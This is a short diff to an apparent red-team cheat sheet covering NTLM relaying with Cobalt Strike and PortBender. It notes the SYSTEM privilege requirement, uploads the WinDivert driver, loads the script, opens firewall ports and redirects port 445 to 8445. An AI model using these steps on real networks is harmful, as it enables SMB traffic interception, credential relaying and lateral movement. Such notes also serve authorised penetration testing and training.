@@ -585,16 +585,18 @@ rportfwd_local stop <PORT>
 
 ### NTLMRelaying with cobalt strike
 - https://github.com/praetorian-inc/PortBender
-- Requires administrator privs
+- Requires system privs
 
 #### Place portbender driver on the target
 ```
 cd C:\Windows\system32\drivers
-upload C:\Tools\PortBender\WinDivert64.sys
+upload WinDivert64.sys
 ```
 
 #### Load portbender.cna
-- Load PortBender.cna from C:\Tools\PortBender this adds a new PortBender command to the console.
+- Load `PortBender.cna` this adds a new PortBender command to the console in Cobalt strike -> Script Manager
+- Breaks SMB service on the machine, also SMB Beacons. 
+- Create the appropriate inbound firewall rules for 445 (file sharing is disabled by default), 8445, and 8080.
 ```
 help PortBender
 PortBender redirect 445 8445
